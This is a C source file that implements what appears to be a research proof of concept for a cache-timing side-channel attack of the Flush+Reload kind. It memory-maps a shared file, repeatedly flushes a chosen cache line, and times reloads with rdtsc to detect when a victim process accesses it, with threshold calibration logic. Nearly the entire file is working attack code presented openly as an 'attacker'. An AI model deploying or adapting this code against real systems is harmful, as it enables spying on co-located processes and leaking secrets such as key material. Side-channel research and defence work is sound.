#define _GNU_SOURCE
#include <pthread.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <stdint.h>
#include "../cacheutils.h"

#define T_ARRAY_SIZE (1)

// Runtime variables, do not change initializations
size_t last_hit = 0;
size_t sequence = 0;
size_t potential_hit = 0;
size_t iter_no = 0;
int tl = 0;
int th = 0;

// Victim specific parameters, shouldn't need to change it 
int acc_interval = 100;
int burst_seq = 3;
int burst_wait = 3;
int burst_gap = 25;

// Attack specific parameters, change it as per calibration results
int regular_gap = 200;
int step_width = 15000; 
int tl_array[T_ARRAY_SIZE] = {22};
int th_array[T_ARRAY_SIZE] = {125};

int set_affinity(long thread_id, int cpu_id){
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu_id,&mask);
    pthread_setaffinity_np(thread_id,sizeof(cpu_set_t),&mask);
}

int measure_access_latency(void* addr){
    int delta;
    asm volatile(
        " mfence           \n\t"
        " lfence           \n\t"
        " rdtsc            \n\t"
        " lfence           \n\t"
        " mov %%rax, %%rdi \n\t"
        " mov (%1), %%r8   \n\t"
        " lfence           \n\t"
        " rdtsc            \n\t"
        " sub %%rdi, %%rax \n\t"
        : "=a"(delta) /*output*/
        : "c"(addr)
        : "r8", "rdi");
    return delta;
}

void *cached_in_c1(void *addr){
    set_affinity(pthread_self(),sysconf(_SC_NPROCESSORS_CONF)/2);
    for(int i=0;i<10;i++){
        flush(&i);
        i += (measure_access_latency(addr)%2);
    }
}

void compute_intensive_code(int sequence){
    long x, y;
    x = 5;
    y = 6;
    int wait_gap = regular_gap;
    if(sequence)	wait_gap = burst_gap;
    for (int i = 0; i < wait_gap; ++i){
        flush(&wait_gap);
        x *= y;
        y *=x;
        if(i%7==0){
            x = y/5.2;
            y = x*0.81;
        }
        else if(i%17==0){
            x = y%13;
            y = x%6;
        }
        else{
            x = y/(x+1);
            y = 4*x/(3*y+7);
        }
    }
}

void verify_threshold(void *addr){
    set_affinity(pthread_self(),0);
    pthread_t t;
    pthread_create(&t,NULL,cached_in_c1,addr);
    compute_intensive_code(0);
    pthread_join(t,NULL);
    
    size_t delta = measure_access_latency(addr);
    if(delta >= tl && delta <= th)
        ;
    else{
        int i;
        for(i = 0; i < T_ARRAY_SIZE; i++){
            if(delta >= tl_array[i] && delta <= th_array[i])
                break;
        }
        if(i >= 0 && i < T_ARRAY_SIZE){
            tl = tl_array[i];
            th = th_array[i];
            iter_no = step_width*i;
        }
        else{
            for(i = 0; i < T_ARRAY_SIZE; i++){
                if(delta >= tl_array[i])
                    break;
            }
            if(i >= 0 && i < T_ARRAY_SIZE){
                tl = tl_array[i];
                th = th_array[i];
                iter_no = step_width*i;
            }
            else{
                //printf("Oh no, delta doesn't reside inside any threshold pair! delta: %ld\n",delta);
                tl = tl_array[T_ARRAY_SIZE - 1];
                th = th_array[T_ARRAY_SIZE - 1];
                iter_no = step_width*(T_ARRAY_SIZE - 1);
            }
        }
        return;
    }   
}


void* attacker(void* addr)
{
    while(1)
    {
        iter_no++;
        tl = tl_array[(iter_no<(T_ARRAY_SIZE - 1)*step_width?iter_no:(T_ARRAY_SIZE - 1)*step_width)/step_width];
        th = th_array[(iter_no<(T_ARRAY_SIZE - 1)*step_width?iter_no:(T_ARRAY_SIZE - 1)*step_width)/step_width];

        asm volatile ("clflush 0(%0)\n"
        :
        : "c" (addr)
        : "rax");

        if(iter_no%400 == 0){
            verify_threshold(addr);
            sched_yield();            
        }
        else{
            compute_intensive_code(sequence);
        }

        size_t delta = measure_access_latency(addr);

        if((delta >= tl && delta <= th) && last_hit > acc_interval && sequence > burst_seq)
        {
            last_hit = 0;
            sequence = 0;
            printf("A entered at t:%ld\n",rdtsc());  
        }
        else if(delta >= tl && delta <= th){
            potential_hit = last_hit;
            sequence++;
        }
        else{
            last_hit++;
            if(last_hit - potential_hit > burst_wait)
                sequence = 0;
        }
    }
}

int main(int argc, char** argv)
{
    if (argc != 3)
        return 1;
    char *filename = argv[1];
    char *offsetp = argv[2];
    unsigned int offset = 0;
    if (!sscanf(offsetp, "%x", &offset))
        return 2;
    int fd = open(filename, O_RDONLY);
    if (fd < 3)
        return 3;
    unsigned char *addr = (unsigned char *) mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);
    if (addr == (void *) -1)
        return 4;
    pthread_t thread;
    pthread_create(&thread, NULL, attacker, (void *)(addr + offset));
    pthread_join(thread, NULL); 
    return 0;
}
